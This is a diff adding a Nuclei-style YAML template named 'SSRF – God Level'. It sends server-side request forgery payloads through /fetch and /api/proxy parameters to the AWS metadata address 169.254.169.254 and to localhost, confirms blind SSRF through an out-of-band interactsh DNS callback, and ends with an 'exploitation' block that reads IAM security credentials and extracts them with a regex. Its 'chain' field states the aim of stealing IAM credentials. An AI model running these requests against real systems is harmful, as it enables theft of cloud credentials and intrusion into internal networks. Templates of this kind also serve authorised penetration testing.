@@ -1,0 +1,54 @@
+id: ssrf-god
+name: SSRF – God Level (OOB + Internal Network Scan)
+severity: critical
+impact: Attacker can access internal services, metadata endpoints, and pivot.
+chain: Combine with AWS metadata to steal IAM credentials.
+
+requests:
+  # 1. Test basic SSRF with URL parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/fetch?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/api/proxy?target=http://localhost:8080"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        words:
+          - "instance-id"
+          - "iam/security-credentials"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "AccessDenied"
+          - "Error"
+
+  # 2. OOB (DNS interaction) – payload uses interactsh
+  - method: GET
+    path:
+      - "{{BaseURL}}/fetch?url=http://{{interactsh-url}}"
+    matchers:
+      - type: dns
+        domain: "{{interactsh-url}}"
+
+verification:
+  # Confirm that the internal URL returns a valid response
+  - method: GET
+    path: "{{BaseURL}}/fetch?url=http://127.0.0.1:8080/status"
+    matchers:
+      - type: status
+        status: 200
+      - type: regex
+        part: body
+        regex:
+          - '"status":"ok"'
+
+exploitation:
+  # Read AWS metadata credentials
+  - method: GET
+    path: "{{BaseURL}}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    extract:
+      type: regex
+      pattern: '(\w+)\s+/\s+(\w+)'
